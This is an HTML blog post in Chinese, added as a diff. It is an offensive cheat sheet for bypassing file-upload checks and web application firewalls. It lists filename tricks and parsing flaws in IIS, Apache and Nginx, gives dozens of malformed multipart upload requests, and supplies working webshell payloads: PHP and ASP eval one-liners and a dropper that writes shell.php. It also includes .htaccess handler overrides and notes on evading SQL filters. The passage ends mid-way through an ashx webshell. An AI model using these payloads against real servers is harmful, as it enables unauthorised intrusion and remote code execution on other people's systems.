@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Upload-AttacK - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="在此感谢下c4rt1y和Tr3jer_CongRong的总结 0x01 常规上传突破 常见扩展名黑名单 1 2 3 4 asp|asa|cer|cdx|aspx|ashx|ascx|asax php|php2|php3|php4|php5|asis|htaccess htm|html|shtml|pwml|phtml|phtm|js|jsp vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini 特殊后缀 1 2 3 4 jsp jspx jspf asp asa cer aspx [IETester] php" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/upload-attack/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Upload-AttacK" />
+<meta property="og:description" content="在此感谢下c4rt1y和Tr3jer_CongRong的总结 0x01 常规上传突破 常见扩展名黑名单 1 2 3 4 asp|asa|cer|cdx|aspx|ashx|ascx|asax php|php2|php3|php4|php5|asis|htaccess htm|html|shtml|pwml|phtml|phtm|js|jsp vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini 特殊后缀 1 2 3 4 jsp jspx jspf asp asa cer aspx [IETester] php" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/upload-attack/" />
+<meta property="article:published_time" content="2017-07-31T16:25:17&#43;00:00"/>
+<meta property="article:modified_time" content="2017-07-31T16:25:17&#43;00:00"/>
+
+<meta itemprop="name" content="Upload-AttacK">
+<meta itemprop="description" content="在此感谢下c4rt1y和Tr3jer_CongRong的总结 0x01 常规上传突破 常见扩展名黑名单 1 2 3 4 asp|asa|cer|cdx|aspx|ashx|ascx|asax php|php2|php3|php4|php5|asis|htaccess htm|html|shtml|pwml|phtml|phtm|js|jsp vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini 特殊后缀 1 2 3 4 jsp jspx jspf asp asa cer aspx [IETester] php">
+
+
+<meta itemprop="datePublished" content="2017-07-31T16:25:17&#43;00:00" />
+<meta itemprop="dateModified" content="2017-07-31T16:25:17&#43;00:00" />
+<meta itemprop="wordCount" content="3228">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Upload-AttacK"/>
+<meta name="twitter:description" content="在此感谢下c4rt1y和Tr3jer_CongRong的总结 0x01 常规上传突破 常见扩展名黑名单 1 2 3 4 asp|asa|cer|cdx|aspx|ashx|ascx|asax php|php2|php3|php4|php5|asis|htaccess htm|html|shtml|pwml|phtml|phtm|js|jsp vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini 特殊后缀 1 2 3 4 jsp jspx jspf asp asa cer aspx [IETester] php"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Upload-AttacK</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x01-常规上传突破">0x01 常规上传突破</a>
+<ul>
+<li><a href="#常见扩展名黑名单">常见扩展名黑名单</a></li>
+<li><a href="#特殊后缀">特殊后缀</a></li>
+<li><a href="#绕过">绕过</a></li>
+<li><a href="#系统特性">系统特性</a></li>
+</ul></li>
+<li><a href="#0x02-iis5-x-6-x解析漏洞">0x02 IIS5.x-6.x解析漏洞</a>
+<ul>
+<li><a href="#目录解析-6-0">目录解析(6.0)</a></li>
+<li><a href="#文件解析">文件解析</a></li>
+<li><a href="#特殊后缀-1">特殊后缀</a></li>
+</ul></li>
+<li><a href="#0x03-apache解析漏洞">0x03 Apache解析漏洞</a></li>
+<li><a href="#0x04-nginx解析漏洞">0x04 nginx解析漏洞</a>
+<ul>
+<li><a href="#空字节代码执行漏洞">空字节代码执行漏洞</a></li>
+<li><a href="#iis-7-0-nginx-8-03畸形解析漏洞">IIS 7.0/ Nginx &lt;8.03畸形解析漏洞</a></li>
+<li><a href="#php-cgi解析漏洞">php-cgi解析漏洞</a></li>
+<li><a href="#win2k3-iis6-0-asp">Win2k3 + IIS6.0 + ASP</a></li>
+</ul></li>
+<li><a href="#0x05-bypass-waf缺陷">0x05 Bypass-WAF缺陷</a></li>
+<li><a href="#0x06-总结">0x06 总结</a></li>
+<li><a href="#0x07-针对云waf">0x07 针对云WAF</a></li>
+<li><a href="#0x08-其他">0x08 其他</a>
+<ul>
+<li><a href="#ashx写asp的一句话">ashx写asp的一句话</a></li>
+<li><a href="#文件包含">文件包含</a></li>
+<li><a href="#编辑器绕过-https-navisec-it-e7-bc-96-e8-be-91-e5-99-a8-e6-bc-8f-e6-b4-9e-e6-89-8b-e5-86-8c"><a href="https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/">编辑器绕过</a></a></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<p>在此感谢下<a href="https://c4rt1y.github.io/">c4rt1y</a>和<a href="http://www.thinkings.org/">Tr3jer_CongRong</a>的总结</p>
+
+<h1 id="0x01-常规上传突破">0x01 常规上传突破</h1>
+
+<h2 id="常见扩展名黑名单">常见扩展名黑名单</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">asp|asa|cer|cdx|aspx|ashx|ascx|asax
+php|php2|php3|php4|php5|asis|htaccess
+htm|html|shtml|pwml|phtml|phtm|js|jsp
+vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</pre></td></tr></table>
+</div>
+</div>
+<h2 id="特殊后缀">特殊后缀</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">jsp jspx jspf
+asp asa cer aspx   [IETester]
+php php php3 php4 pphphp
+exe exee</pre></td></tr></table>
+</div>
+</div>
+<h2 id="绕过">绕过</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[*] [00][80]        截断 iconv截断
+[*] js              burpsuite绕过
+[*] mime类型         content-type  校验常见的 image/jpeg image/png
+[*] 图片检测         getimagesize  合成图马上传即可 copy 1.jpg/b + poc.txt 2.jpg
+[*] 扩展名           黑名单  系统特性和特殊文件名容易绕过
+                    白名单  文件包含或者解析漏洞绕过  重命名限制脚本执行权限难解
+[*] 目录路径         突破上级目录和同级目录限制 uploads/../1.php   uploads/../x/1.php
+[*] .htaccess       上传覆盖绕过</pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p>轻量级检测绕过攻击</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[*] 绕过 javascript对扩展名的检测
+[*] 绕过服务端对http request包   MIME类型检测</pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p>路径/扩展名检测绕过攻击</p>
+
+<p><code>黑名单</code>绕过</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[*] 文件名大小写绕过
+[*] 名单列表绕过
+[*] 特殊文件名绕过
+[*] 0x00  截断绕过
+[*] .htaccess绕过
+[*] 文件包含漏洞
+[*] Apache解析漏洞
+[*] IIS解析漏洞
+[*] Nginx解析漏洞</pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p><code>白名单</code>绕过</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[*] 0x00截断绕过
+[*] php 文件包含漏洞
+[*] IIS 解析漏洞
+[*] Nginx解析漏洞</pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p><code>文件内容</code>检测绕过攻击</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[*] 文件加载绕过      二次渲染和ImageMagick基本没戏
+
+    function image_gd_open($file, $extension)   //后台GD库二次渲染的代码
+    {
+    $extension = str_replace(&#39;jpg&#39;, &#39;jpeg&#39;, $extension);
+    $open_func = &#39;imageCreateFrom&#39;. $extension; //函数名变成 imageCreateFrompng 之类
+    if (!function_exists($open_func))
+    {
+    return FALSE;
+    }
+    return $open_func($file); //变成 imagecreatefrompng(&#39;/tmp/php0lbTOn&#39;)
+    }
+将上传的文件中属于图片部分的数据抓取，再使用API或者函数重新将图片生成保存</pre></td></tr></table>
+</div>
+</div>
+<h2 id="系统特性">系统特性</h2>
+
+<blockquote>
+<p>Windows特殊字符</p>
+</blockquote>
+
+<p><img src="https://img.04z.net/img/10.png" alt="图片已损坏" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.php[%80-%99]  当然还有php的iconv函数的80截断
+1.asp.
+1.asp [空格]
+1.php:1.jpg    1.&lt;&lt;&lt;
+1.php::$DATA
+1.php::$DATA……[256]</pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p>Linux大小写敏感</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.Php  1.pHp  1.phP</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x02-iis5-x-6-x解析漏洞">0x02 IIS5.x-6.x解析漏洞</h1>
+
+<h2 id="目录解析-6-0">目录解析(6.0)</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.asa/1.jpg
+1.asp/1.jpg
+1.cer/1.jpg</pre></td></tr></table>
+</div>
+</div>
+<h2 id="文件解析">文件解析</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.asa;1.jpg
+1.asp;1.jpg
+1.cer;1.jpg</pre></td></tr></table>
+</div>
+</div>
+<h2 id="特殊后缀-1">特殊后缀</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.asa
+1.cer
+1.cdx</pre></td></tr></table>
+</div>
+</div>
+<p>re :文件解析/截断等 重命名无解</p>
+
+<h1 id="0x03-apache解析漏洞">0x03 Apache解析漏洞</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.php.Axiba</pre></td></tr></table>
+</div>
+</div>
+<p><strong>Apache配置文件</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">.htaccess突破
+
+    &lt;FilesMatch &#34;1.jpg&#34;&gt;
+
+    SetHandler application/x-httpd-php
+    &lt;/FilesMatch&gt;    上传1.jpg即可
+
+Apache的conf配置
+    AddHandler php5-script .php
+        文件名里包含.php,即使文件名是test.php.jpg 也会以php 来执行
+
+    AddType application/x-httpd-php .jpg
+        扩展名是jpg，一样能以php方式执行</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x04-nginx解析漏洞">0x04 nginx解析漏洞</h1>
+
+<h2 id="空字节代码执行漏洞">空字节代码执行漏洞</h2>
+
+<p>Nginx 0.5.* Nginx 0.6.* Nginx 0.7 &lt;= 0.7.65 Nginx 0.8 &lt;= 0.8.37</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.jpg%00.php</pre></td></tr></table>
+</div>
+</div>
+<p>Nginx 0.8.41 – 1.5.6</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.jpg%20%00.php</pre></td></tr></table>
+</div>
+</div>
+<h2 id="iis-7-0-nginx-8-03畸形解析漏洞">IIS 7.0/ Nginx &lt;8.03畸形解析漏洞</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;
+web访问1.jpg/.php,当前目录下会生成shell.php</pre></td></tr></table>
+</div>
+</div>
+<h2 id="php-cgi解析漏洞">php-cgi解析漏洞</h2>
+
+<p>Win2k8 + IIS7.0 + PHP   [IIS 7.0/7.5 Nginx &lt; 0.8.3]</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">-----------------------------1315172757593483281034936488
+Content-Disposition: form-data; name=&#34;upfile&#34;; filename=&#34;1.php&#34;
+Content-Type: text/plain
+-----------------------------1315172757593483281034936488
+Content-Disposition: form-data; name=&#34;upfile&#34;; filename=&#34;1.jpg&#34;
+Content-Type: text/plain</pre></td></tr></table>
+</div>
+</div>
+<h2 id="win2k3-iis6-0-asp">Win2k3 + IIS6.0 + ASP</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">-----------------------------1315172757593483281034936488
+Content-Disposition: form-data; name=&#34;upfile&#34;;
+Content-Type: text/plain
+filename=&#34;1.asp&#34;
+
+&lt;%eval request(&#34;1&#34;)%&gt;</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x05-bypass-waf缺陷">0x05 Bypass-WAF缺陷</h1>
+
+<p>匹配过于严谨：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1   Content-Type: multipart/form-data; boundary=
+    [加个空格]---------------------------4714631421141173021852555099
+
+2   boundary不一致
+    Content-Type: multipart/form-data;
+    boundary=---------------------------4714631421141173021852555099
+    Content-Length: 253
+
+    -----------------------------47146314211411730218525[改成别的]99
+    Content-Disposition: form-data; name=&#34;file1&#34;; filename=&#34;shell.asp&#34;
+    Content-Type: application/octet-stream
+
+    &lt;%eval request(&#34;a&#34;)%&gt;
+    -----------------------------4714631421141173021852555099--
+
+3   ASCII &gt; 127的字符
+    1.asp;[af截断].jpg
+
+4   Content-Disposition长度[例如超过1M]字节[将垃圾数据放在数据包最开头]
+
+5   长文件名 1.................[很长]..........................php
+
+6   特殊的长文件名
+    shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg
+
+7   多个filename
+    -----------------------------47146314211411730218525[改成别的]99
+    Content-Disposition: form-data; name=&#34;file1&#34;; filename=&#34;1.asp&#34;;filename=&#34;1.jpg&#34;    [或者把filename放到content-type下面]
+    Content-Type: application/octet-stream
+
+8   POST/GET
+    上传一个POST型的数据包，抓包将POST改为GET
+
+9   删除实体里面的Conten-Type字段
+    一.删除Content整行
+    二.删除C后面的字符
+    正常包：
+        Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;1.png&#34;
+        Content-Type: image/png
+    构造包：
+        Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;1.png
+        C.php&#34;
+
+10  文件名回车
+    -----------------------------4714631421141173021852599
+    Content-Disposition: form-data; name=&#34;file1&#34;; filename=&#34;shell.as
+    p&#34;
+    Content-Type: application/octet-stream
+
+11  删除Content-Disposition字段里的空格
+
+12  修改Content-Disposition字段值的大小写
+    -----------------------------4714631421141173021852599
+    Content-Disposition: [大写F]orm-data; name=&#34;file1&#34;; filename=&#34;shell.asp&#34;
+    Content-Type: application/octet-stream
+
+13  Tab
+    -----------------------------20566128503514
+    Content-Disposition: form-data; name=&#34;uploaded&#34;; filename=[Tab]     &#34;e.php&#34;
+    Content-Type: application/force-download
+
+14  去空格
+    -----------------------------20566128503514
+    Content-Disposition: form-data;name=&#34;uploaded&#34;; filename=&#34;e.php&#34;
+    Content-Type: application/force-download
+
+15  form-data删掉
+    -----------------------------20566128503514
+    Content-Disposition: ;name=&#34;uploaded&#34;; filename=&#34;e.php&#34;
+    Content-Type: application/force-download
+
+16  加个符号
+    -----------------------------20566128503514
+    Content-Disposition: form-data;; name=&#34;uploaded&#34;; filename=&#34;e.php&#34;
+    Content-Type: application/force-download</pre></td></tr></table>
+</div>
+</div>
+<p><strong><em>顺便提下数据库</em></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Mysql       1e1{union from}、\nkeyword、{+ - `` &#39;&#39; &#34;&#34; ~ ! @ () {} }keyword
+            10个可代替空格的字符、Error Return设计缺陷等 …
+
+Mssql       30多个可代替空格的字符、Error Return设计缺陷等 …
+
+Annotation  -- , # , -- + , // , -- - , /**/ , ;%00 , /*!20000*/
+
+Apache      解析特性、HPP、畸形method、畸形Boundary等 …
+
+Nginx       关注系统&amp;语言&amp;数据库特性&amp;解析特性等 …
+
+OSX         test.php{\xFC[\x80-\x83]}
+
+Linux       host&#39;&#39;name
+
+Windows&amp;IIS
+            Unicode、畸形Unicode、ADS流、N种HTTP畸形正文、
+            解析特性、截断特性、HP、畸形Boundary、GET／POST傻傻分不清、
+            无数畸形字符可以 代替正常字符等 …
+
+Encoder     Json、Unicode、Base64、Url Encode、Html、Serialize、双重编码等 …
+
+User-Agent  特殊放行  [google蜘蛛：Googlebot 百度蜘蛛：Baiduspider]</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x06-总结">0x06 总结</h1>
+
+<hr />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">    [*] filename在content-type下面
+    [*] .asp{80-90}
+    [*] NTFS ADS
+    [*] .asp...
+    [*] boundary不一致
+    [*] iis6分号截断asp.asp;asp.jpg
+    [*] apache解析漏洞php.php.ddd
+    [*] boundary和content-disposition中间插入换行
+    [*] hello.php:a.jpg然后hello.&lt;&lt;&lt;
+    [*] filename=php.php
+    [*] filename=&#34;a.txt&#34;;filename=&#34;a.php&#34;
+    [*] name=\n&#34;file&#34;;filename=&#34;a.php&#34;
+    [*] content-disposition:\n
+    [*] .htaccess文件
+    [*] a.jpg.\nphp
+    [*] 去掉content-disposition的form-data字段
+    [*] php&lt;5.3 单双引号截断特性
+    [*] 删掉content-disposition: form-data;
+    [*] content-disposition\00:
+    [*] {char}+content-disposition
+    [*] head头的content-type: tab
+    [*] head头的content-type: multipart/form-DATA
+    [*] filename后缀改为大写
+    [*] head头的Content-Type: multipart/form-data;\n
+    [*] .asp空格
+    [*] .asp0x00.jpg截断
+    [*] 双boundary
+    [*] file\nname=&#34;php.php&#34;
+    [*] head头content-type空格:
+    [*] form-data字段与name字段交换位置</pre></td></tr></table>
+</div>
+</div>
+<hr />
+
+<h1 id="0x07-针对云waf">0x07 针对云WAF</h1>
+
+<p>• 不要相信Demo的规则<br />
+• 多收集例站进行站点随机<code>Fuzz</code>，建议至少50+<br />
+• 针对IPS／IDS<br />
+• 尽可能先拿到早版本的交互层代码<br />
+• 扫其服务测其EXP<br />
+• 针对主机防护软件<br />
+• WAF就在眼前，Rule我想去猜猜<br />
+• 懂逆向则逆向，不懂逆向就瞎Fuzz，内存泄露、dll劫持使劲怼，crash了最好。</p>
+
+<h1 id="0x08-其他">0x08 其他</h1>
+
+<h2 id="ashx写asp的一句话">ashx写asp的一句话</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">&lt;%@ WebHandler Language=&#34;C#&#34;Class=&#34;Handler&#34; %&gt;
+
+using System;
+using System.Web;
+using System.IO;
+public class Handler : IHttpHandler {
+public void ProcessRequest (HttpContext context) {
+context.Response.ContentType = &#34;text/plain&#34;;
+
